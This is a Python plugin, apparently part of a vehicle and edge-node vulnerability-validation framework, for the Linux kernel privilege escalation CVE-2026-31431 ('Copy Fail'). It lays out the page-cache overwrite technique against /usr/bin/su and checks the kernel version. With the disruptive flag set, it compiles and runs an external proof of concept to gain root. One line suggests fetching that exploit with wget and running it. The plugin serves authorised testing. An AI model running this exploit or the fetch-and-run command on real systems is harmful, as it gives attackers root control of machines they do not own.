#!/usr/bin/env python3
"""CVE-2026-31431 – Linux Copy Fail LPE: AF_ALG AEAD in-place splice page cache write without COW guard → root.

Public PoC source: https://copy.fail  (https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-31431%20Copy%20Fail)
  Files: ['exploit/poc.c']
  Technique:
    1. Open AF_ALG socket with AEAD algorithm (e.g. gcm(aes)).
    2. splice() read-only page cache (e.g. /usr/bin/su) into the AEAD socket buffer.
    3. AEAD decrypt path processes skb frag in-place without COW guard.
    4. Controlled decrypt output writes attacker-chosen bytes into page cache.
    5. execve(/usr/bin/su) → root shell from polluted page cache.
  Affected: Linux 4.14 ≤ k < 6.6.137 / 6.12.85 / 6.18.22 etc. (patched by a664bf3d603d)

Reference: https://copy.fail
  NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-31431
"""
from __future__ import annotations

import re
import subprocess
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 37,
    "cve": "CVE-2026-31431",
    "year": 2026,
    "domain": "advanced",
    "vendor_product": "Linux kernel 4.14–6.18 (IVI/边缘 Linux 节点)",
    "component": "Linux kernel crypto/af_alg.c + fs/splice.c – AEAD in-place decrypt missing COW guard",
    "type": "本地权限提升 (LPE) → root / Page Cache 写入原语",
    "summary": (
        "Copy Fail CVE-2026-31431: AF_ALG AEAD socket 收到 splice() 注入的只读文件 page cache frag，"
        "原地解密时缺少 COW 保护，允许攻击者将受控字节写入只读文件 page cache（如 /usr/bin/su），"
        "随后 execve 执行被污染的 page cache 获得 root shell。"
        "影响 Linux 4.14–6.18；车载 Linux IVI/边缘节点需排查。"
    ),
    "source_url": "https://copy.fail",
    "requires_manual_review": True,
    "affected": [
        {
            "vendor": "Linux",
            "product": "Linux kernel",
            "versions": [
                {"version": "4.14", "status": "affected", "lessThan": "5.10.254"},
                {"version": "5.11", "status": "affected", "lessThan": "5.15.204"},
                {"version": "5.16", "status": "affected", "lessThan": "6.1.170"},
                {"version": "6.2", "status": "affected", "lessThan": "6.6.137"},
                {"version": "6.7", "status": "affected", "lessThan": "6.12.85"},
                {"version": "6.13", "status": "affected", "lessThan": "6.18.22"},
            ],
        }
    ],
}

POC_REPO = (
    Path(__file__).parent.parent.parent
    / "public_poc_sources/repos/Unclecheng-li__poc-lab"
    / "CVE-2026-31431 Copy Fail/exploit"
)


def _check_version() -> dict:
    result: dict = {}
    try:
        r = subprocess.run(["uname", "-r"], capture_output=True, text=True, timeout=5)
        kver = r.stdout.strip()
        result["kernel_version"] = kver

        m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", kver)
        if m:
            major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)
            vuln = False
            if major == 4 and minor >= 14:
                vuln = True
            elif major == 5:
                vuln = True
            elif major == 6:
                if minor < 6 or (minor == 6 and patch < 137):
                    vuln = True
                elif minor >= 7 and minor < 12:
                    vuln = True
                elif minor == 12 and patch < 85:
                    vuln = True
                elif minor == 13 and patch < 22:
                    vuln = True
            result["version_in_affected_range"] = vuln

        # Check AF_ALG availability
        af_alg = Path("/proc/sys/crypto")
        result["af_alg_available"] = af_alg.exists() or Path("/proc/crypto").exists()

        # Check patch symbol a664bf3d603d (not easily detectable, use version heuristic)
        # Check user namespace
        userns = Path("/proc/sys/user/max_user_namespaces")
        result["user_namespace_max"] = userns.read_text().strip() if userns.exists() else "unknown"

        # Check /usr/bin/su target
        su_paths = ["/usr/bin/su", "/bin/su"]
        result["su_target"] = next((p for p in su_paths if Path(p).exists()), None)

    except Exception as exc:
        result["check_error"] = str(exc)
    return result


def _compile_and_run(allow_disruptive: bool, lab_cmd: str) -> dict:
    result: dict = {}
    poc_c = POC_REPO / "poc.c"

    if not poc_c.exists():
        result["poc_repo_missing"] = str(POC_REPO)
        result["detail"] = (
            "Clone https://github.com/Unclecheng-li/poc-lab into "
            "public_poc_sources/repos/Unclecheng-li__poc-lab to enable compilation. "
            "Alternative: wget https://copy.fail/poc.c && gcc -O2 -Wall -o poc poc.c && ./poc"
        )
        result["would_compile"] = "gcc -O2 -Wall -o poc poc.c"
        result["would_run"] = "./poc"
        return result

    if not allow_disruptive:
        result["would_compile"] = "gcc -O2 -Wall -o poc poc.c"
        result["would_run"] = "./poc"
        result["detail"] = (
            "Set allow_disruptive=true to compile and run Copy Fail PoC. "
            "WARNING: Pollutes /usr/bin/su page cache → root shell. Isolated VM required."
        )
        return result

    with tempfile.TemporaryDirectory() as tmpdir:
        import shutil
        shutil.copy2(str(poc_c), f"{tmpdir}/poc.c")
        r = subprocess.run(
            "gcc -O2 -Wall -o poc poc.c",
            shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=60,
        )
        result["compile_rc"] = r.returncode
        result["compile_out"] = (r.stdout + r.stderr)[:400]
        if r.returncode != 0:
            result["detail"] = "Compile failed."
            return result

        r2 = subprocess.run(
            f"./poc; {lab_cmd}",
            shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=120,
        )
        result["run_rc"] = r2.returncode
        result["run_out"] = (r2.stdout + r2.stderr)[:600]
        result["exploited"] = "uid=0" in r2.stdout or "root" in r2.stdout.lower()
    return result


def _run_poc(plugin) -> dict:
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    # Never accept a client-provided local command. The fixed identity probe is
    # sufficient to record the post-exploit privilege level.
    lab_cmd = "id"

    evidence: dict = {
        "cve": "CVE-2026-31431",
        "poc_repo": str(POC_REPO),
        "poc_repo_present": (POC_REPO / "poc.c").exists(),
        "exploit_files": ["exploit/poc.c"],
        "technique": (
            "AF_ALG AEAD socket + splice(/usr/bin/su page) → in-place AEAD decrypt without COW guard "
            "→ attacker-controlled bytes written into page cache → execve(/usr/bin/su) → uid=0. "
            "Patch: a664bf3d603d. Reference: https://copy.fail"
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-31431",
    }

    ver = _check_version()
    evidence.update(ver)
    exploit = _compile_and_run(allow_disruptive, lab_cmd)
    evidence.update(exploit)

    return {
        "vulnerable": evidence.get("exploited"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "https://copy.fail",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class LinuxKernelCopyFailLPEAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-ADV-037"
    meta_poc_name = 'CVE-2026-31431 Copy Fail AF ALG AEAD Active Validation'
    meta_cve_id = "CVE-2026-31431"
    meta_severity = "High"
    meta_protocol = "local"
    meta_target_os = ["linux"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive", "lab_command"]
    meta_profiles = ["advanced", "kernel", "pagecache"]
    meta_source_url = "https://copy.fail"
    meta_references       = ['https://copy.fail']
    meta_attack_surface = "本地用户通过 AF_ALG AEAD splice 路径污染 setuid 二进制 page cache → root"
    is_disruptive = True
    meta_destructive_level = "RootCompromise"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "37_Linux_Kernel_Copy_Fail_LPE_Audit") if "VULN" in dir() else "37_Linux_Kernel_Copy_Fail_LPE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = LinuxKernelCopyFailLPEAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
